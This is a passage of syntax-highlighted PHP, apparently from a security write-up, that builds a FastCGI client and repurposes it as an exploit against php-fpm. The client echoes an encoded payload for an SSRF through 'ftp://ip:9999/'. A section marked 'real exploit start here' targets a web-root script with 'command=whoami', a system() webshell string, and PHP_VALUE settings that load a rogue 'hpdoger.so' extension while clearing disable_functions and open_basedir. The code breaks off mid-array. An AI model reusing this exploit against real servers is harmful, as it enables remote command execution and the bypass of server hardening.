class="token keyword">function</span> <span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$len</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getValues</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token comment">//        $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$paramsRequest</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildPacket</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'?file=ftp://ip:9999/&amp;data='</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        fwrite($this->_sock, $request);</span><span class="token comment">//        do &#123;</span><span class="token comment">//            $resp = $this->readPacket();</span><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span><span class="token comment">//                $response .= $resp['content'];</span><span class="token comment">//            &#125;</span><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment">//        var_dump($resp);</span><span class="token comment">//        if (!is_array($resp)) &#123;</span><span class="token comment">//            throw new Exception('Bad request');</span><span class="token comment">//        &#125;</span><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span><span class="token comment">//            case self::CANT_MPX_CONN:</span><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::OVERLOADED:</span><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::UNKNOWN_ROLE:</span><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::REQUEST_COMPLETE:</span><span class="token comment">//                return $response;</span><span class="token comment">//        &#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// real exploit start here</span><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span><span class="token comment">//    die("Check your input\n");</span><span class="token comment">//&#125;</span><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span><span class="token comment">//    $filepath = __FILE__;</span><span class="token comment">//&#125;else&#123;</span><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment">//&#125;</span><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token punctuation">.</span><span class="token single-quoted-string string">'?'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token comment">// php payload -- Doesnt do anything</span><span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span> <span class="token comment">// extension_dir即为.so文件所在目录</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token single-quoted-string string">'GATEWAY_INTERFACE'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REQUEST_METHOD'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'POST'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SCRIPT_FILENAME'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SCRIPT_NAME'</span>       <span class="token operator">=</span><span 